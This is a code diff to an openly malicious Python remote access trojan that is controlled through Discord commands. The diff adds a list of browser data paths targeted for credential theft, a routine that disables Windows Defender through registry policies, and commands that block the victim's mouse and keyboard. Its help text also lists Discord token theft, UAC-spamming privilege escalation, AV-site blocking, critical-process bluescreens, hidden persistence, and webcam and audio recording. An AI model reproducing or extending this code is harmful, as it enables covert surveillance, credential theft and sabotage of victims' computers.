@@ -10,7 +10,6 @@ import pyautogui
 import pyperclip
 import random
 import requests
-import shutil
 import socket
 import subprocess
 import sys
@@ -27,6 +26,8 @@ import wave
 import sqlite3
 import numpy as np
 import sounddevice as sd
+import win32crypt
+import shutil
 from pynput import keyboard
 from urllib3 import PoolManager, HTTPResponse
 from ctypes import *
@@ -34,7 +35,9 @@ from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, init
 from discord.ext import commands
 from PIL import Image, ImageTk, ImageGrab
-from win32crypt import CryptUnprotectData
+from datetime import datetime, timedelta
+
+from Crypto.Cipher import AES
 
 os.system("@echo off")
 os.system("cls")
@@ -685,6 +688,33 @@ def get_paths():
         "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
     }
 
+browsers = {
+    'avast': LOCALAPPDATA + '\\AVAST Software\\Browser\\User Data',
+    'amigo': LOCALAPPDATA + '\\Amigo\\User Data',
+    'torch': LOCALAPPDATA + '\\Torch\\User Data',
+    'kometa': LOCALAPPDATA + '\\Kometa\\User Data',
+    'orbitum': LOCALAPPDATA + '\\Orbitum\\User Data',
+    'cent-browser': LOCALAPPDATA + '\\CentBrowser\\User Data',
+    '7star': LOCALAPPDATA + '\\7Star\\7Star\\User Data',
+    'sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data',
+    'chromium': LOCALAPPDATA + '\\Chromium\\User Data',
+    'chrome-canary': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data',
+    'chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data',
+    'epic-privacy-browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data',
+    'msedge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data',
+    'msedge-canary': LOCALAPPDATA + '\\Microsoft\\Edge SxS\\User Data',
+    'msedge-beta': LOCALAPPDATA + '\\Microsoft\\Edge Beta\\User Data',
+    'msedge-dev': LOCALAPPDATA + '\\Microsoft\\Edge Dev\\User Data',
+    'uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data',
+    'yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': LOCALAPPDATA + '\\Iridium\\User Data',
+    'coccoc': LOCALAPPDATA + '\\CocCoc\\Browser\\User Data',
+    'opera': APPDATA + '\\Opera Software\\Opera Stable',
+    'opera-gx': APPDATA + '\\Opera Software\\Opera GX Stable'
+}
+
 async def tokenoutput(ctx):
     tokens = GetTokens()
     
@@ -826,6 +856,26 @@ async def send_file(ctx, file_path):
 
     os.remove(file_path)
 
+async def windowsdefender_disable():
+    try:
+        key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
+        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
+            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
+            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
+            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
+    except:
+        key_path = r"SOFTWARE\Policies\Microsoft\Windows Security"
+        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_ALL_ACCESS) as key:
+            reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
+            reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
+            reg.SetValueEx(key, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
+
+def block_inputs():
+    ctypes.windll.user32.BlockInput(True)
+
+def unblock_inputs():
+    ctypes.windll.user32.BlockInput(False)
+
 @bot.command()
 async def help(ctx):
     embed = discord.Embed(
@@ -881,6 +931,7 @@ async def help(ctx):
     embed1.add_field(name="!recaudio (sec)", value="Records audio for a specific number of seconds 🎤📷", inline=False)
     embed1.add_field(name="!recwebcam (sec)", value="Records webcam for a specific number of seconds 📷📷", inline=False)
     embed1.add_field(name="!tokens", value="Get Discord Tokens 🎁", inline=False)
+    # embed1.add_field(name="!browser", value="Get Browser Passwords & more! 🦕🦕", inline=False) Not added rn bc i tried adding for over 6-8 hours or smth and i cant get it to work ;(
     embed1.add_field(name="!getadmin", value="Gets admin Permissions by spamming UAC prompts 🛠️", inline=False)
     embed1.add_field(name="", value="", inline=False)
     embed1.add_field(name="", value="**Admin required Features:**", inline=False)
@@ -888,17 +939,19 @@ async def help(ctx):
     embed1.add_field(name="!taskmgr_enable", value="Enables Task Manager 🎰", inline=False)
     embed1.add_field(name="!blocklist", value="Disables the Victim to lookup common AV Sites 🦠", inline=False)
     embed1.add_field(name="!unblocklist", value="Enables the Victim to lookup common AV Sites 🦠", inline=False)
-    embed1.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
 
     await ctx.send(embed=embed1)
 
     embed2 = discord.Embed(
         color=0x00ff00 
     )
+    embed2.add_field(name="!nostartup", value="Disable Users permissions to look in the Startup Folder 🔒🗂️", inline=False)
     embed2.add_field(name="!nostartup_disable", value="Enables Users permissions to look in the Startup Folder 🔓🗂️", inline=False)
     embed2.add_field(name="!critproc", value="Makes H-zz-H a critical process. Close = Bluescreen 🆙", inline=False)
     embed2.add_field(name="!uncritproc", value="Removes the critical process. 🆙", inline=False)
     embed2.add_field(name="!smartup", value="Uses an Unknown StartUp path. 🐀", inline=False)
+    embed2.add_field(name="!windef", value="Disables Windows Defender. 🛡", inline=False)
+    embed2.add_field(name="!block", value="Blocks/Unblocks the inputs. 🖱️❌⌨️", inline=False)
     embed2.add_field(name="", value="", inline=False)
     embed2.add_field(name="", value="**Troll Features:**", inline=False)
     embed2.add_field(name="!floatpic (seconds) (url)", value="Creates an floating unclosable image for (seconds)", inline=False)
@@ -911,6 +964,69 @@ async def help(ctx):
     embed2.add_field(name="", value="Made with ❤ by H-zz-H.", inline=False)
 
     await ctx.send(embed=embed2)
+
+input_blocked = False
+@bot.command()
+async def block(ctx):
+    global input_blocked
+
+    if is_admin():
+        try:
+            if input_blocked:
+                unblock_inputs()
+                input_blocked = False
+                embed = discord.Embed(
+                    title="✅ Mouse & Keyboard Unblocked",
+                    description="Successfully unblocked the mouse and keyboard input. 🖱️⌨️",
+                    color=discord.Color.green()
+                )
+            else:
+                block_inputs()
+                input_blocked = True
+                embed = discord.Embed(
+                    title="✅ Mouse & Keyboard Blocked",
+                    description="Successfully blocked the mouse and keyboard input. 🖱️❌⌨️",
+                    color=discord.Color.green()
+                )
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Failed to Block/Unblock!",
+                description=f"Error occurred: `{e}`",
+                color=discord.Color.red()
+            )
+    else:
+        embed = discord.Embed(
+            title="❌ Admin Privileges Required!",
+            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
+            color=discord.Color.red()
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def windef(ctx, process: str = "disable"):
+    if is_admin():
+        try:
+            await windowsdefender_disable()
+            embed = discord.Embed(
+                title="✅ Success on Disabling!",
+                description="Successfully disabled Windows Defender! (May need restart!) 🛡",
+                color=discord.Color.green()
+            )
+        except Exception as e:
+            embed = discord.Embed(
+                title="❌ Failed to disable!",
+                description=f"Error occurred: `{e}`",
+                color=discord.Color.red()
+            )
+        await ctx.send(embed=embed)
+    else:
+        embed = discord.Embed(
+            title="❌ Failed to disable Windows Defender!",
+            description="This script isn't running with Admin! Use `!getadmin` to get Admin!",
+            color=discord.Color.red()
+        )
+        await ctx.send(embed=embed)
 
 @bot.command()
 async def taskkill(ctx, process: str):
